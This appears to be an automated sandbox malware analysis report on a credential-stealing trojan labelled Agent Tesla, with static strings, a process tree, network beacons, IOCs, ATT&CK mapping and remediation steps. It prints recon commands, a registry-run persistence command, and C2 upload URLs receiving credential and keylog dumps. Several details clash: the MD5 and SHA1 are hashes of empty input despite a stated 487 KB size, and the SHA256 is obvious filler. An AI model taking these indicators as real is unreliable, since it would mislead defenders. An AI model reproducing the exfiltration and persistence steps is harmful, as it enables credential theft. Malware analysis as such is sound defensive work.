MALWARE ANALYSIS REPORT
=======================
Sample: svchost32.exe
Analyst: Automated Sandbox (Any.Run v2.4)
Date: 2024-11-14 14:24:00 UTC
Case: INC-2024-1114-001

--- FILE INFORMATION ---
Filename:     svchost32.exe
MD5:          d41d8cd98f00b204e9800998ecf8427e
SHA1:         da39a3ee5e6b4b0d3255bfef95601890afd80709
SHA256:       a3f5bc9d2e1047ab8c6d4f7e9012345678901234567890abcdef1234567890ab
File Size:    487,424 bytes
File Type:    PE32 executable (GUI) Intel 80386
Compiled:     2024-11-10 08:22:14 UTC
Packer:       UPX 3.96

--- STATIC ANALYSIS ---
Suspicious Strings Found:
  - "cmd.exe /c whoami"
  - "net user administrator"
  - "ipconfig /all"
  - "tasklist /v"
  - "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
  - "http://91.108.4.100:8080/gate.php"
  - "http://91.108.4.100:8080/upload.php"
  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  - "Content-Type: multipart/form-data"
  - "SOFTWARE\Microsoft\Windows NT\CurrentVersion"
  - "%APPDATA%\Microsoft\svchost32.exe"

Import Table (suspicious):
  - CreateRemoteThread    [process injection]
  - VirtualAllocEx        [memory manipulation]
  - WriteProcessMemory    [process injection]
  - OpenProcess           [process access]
  - GetAsyncKeyState      [keylogging]
  - SetWindowsHookEx      [keylogging]
  - InternetOpenA         [network communication]
  - InternetConnectA      [network communication]

--- DYNAMIC ANALYSIS (Sandbox Execution) ---
Process Tree:
  flash_update.exe (PID 4821)
    └─ svchost32.exe (PID 1337)  [DROPPED & EXECUTED]
         ├─ cmd.exe /c whoami
         ├─ cmd.exe /c ipconfig /all  
         ├─ cmd.exe /c tasklist /v
         └─ explorer.exe  [INJECTED]

Registry Modifications:
  CREATED: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  VALUE:   C:\Users\AppData\Roaming\Microsoft\svchost32.exe
  PURPOSE: Persistence - survives reboot

Files Created:
  C:\Users\AppData\Roaming\Microsoft\svchost32.exe  [self-copy]
  C:\Users\AppData\Local\Temp\kl_log.dat            [keylog file]
  C:\Users\AppData\Local\Temp\sc_data.bin            [screenshot data]

Network Activity:
  DNS:  malware-c2.darkweb.to → 91.108.4.100
  HTTP POST http://91.108.4.100:8080/gate.php
    Data: bot_id=WIN10-DEVSERVER&os=Windows10&user=SYSTEM&av=None
    Response: {"cmd":"harvest","interval":45}
  HTTP POST http://91.108.4.100:8080/upload.php
    Data: [encrypted credential dump + keylog data]
    Size: 96KB per beacon, interval=45 seconds

Credentials Harvested:
  Browser: Chrome - savedpasswords.db accessed
  Browser: Firefox - logins.json accessed  
  Email: Outlook - profile accessed
  System: SAM database dump attempted

--- CLASSIFICATION ---
Family:       AGENT_TESLA v3.6
Type:         Remote Access Trojan (RAT) + Keylogger + Credential Stealer
Severity:     CRITICAL
Confidence:   HIGH (98%)

--- MITRE ATT&CK MAPPING ---
T1566.002  Phishing: Spearphishing Link
T1204.002  User Execution: Malicious File  
T1055.001  Process Injection: Dynamic-link Library Injection
T1547.001  Boot/Logon Autostart: Registry Run Keys
T1056.001  Input Capture: Keylogging
T1539     Steal Web Session Cookie
T1041     Exfiltration Over C2 Channel
T1071.001  Web Protocols (HTTP)

--- INDICATORS OF COMPROMISE ---
File Hashes:
  a3f5bc9d2e1047ab8c6d4f7e9012345678901234567890abcdef1234567890ab (SHA256)
  d41d8cd98f00b204e9800998ecf8427e (MD5)

IP Addresses:
  91.108.4.100  (C2 Server - Amsterdam, NL)
  185.220.101.47 (TOR Exit Node - Frankfurt, DE)

Domains:
  malware-c2.darkweb.to
  corp-secure-login.tk
  dropbox-share.info
  adobe-flash-player.com

URLs:
  http://91.108.4.100:8080/gate.php
  http://91.108.4.100:8080/upload.php
  http://corp-secure-login.tk/reset

Registry Keys:
  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate

File Paths:
  C:\Users\AppData\Roaming\Microsoft\svchost32.exe
  C:\Users\AppData\Local\Temp\kl_log.dat

--- RECOMMENDATIONS ---
1. IMMEDIATE: Isolate dev-server from network
2. IMMEDIATE: Reset ALL credentials on affected system and related accounts  
3. HIGH: Scan all systems for IOCs listed above
4. HIGH: Review all outbound connections to 91.108.4.100 and 185.220.101.47
5. HIGH: Audit all data accessed by dev.service account since 14:20
6. MEDIUM: Implement email filtering for executable attachments
7. MEDIUM: Deploy EDR solution on all endpoints
8. LOW: User awareness training on phishing identification
